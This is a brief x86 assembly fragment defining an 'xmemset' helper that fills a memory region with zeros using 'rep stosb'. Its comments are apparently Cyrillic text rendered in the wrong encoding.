;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xmemset:
	push	eax
	push	ecx
	push	edi
	xor		eax, eax													;eax = 0;
	mov		edi, dword ptr [esp + 16]									;edi = addr
	mov		ecx, dword ptr [esp + 20]									;ecx = size
	rep		stosb														;����塞; 
	pop		edi
	pop		ecx
	pop		eax
	ret		04 * 02
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪� xmemset 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ��� �ᯮ����⥫��� �㭮�; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx






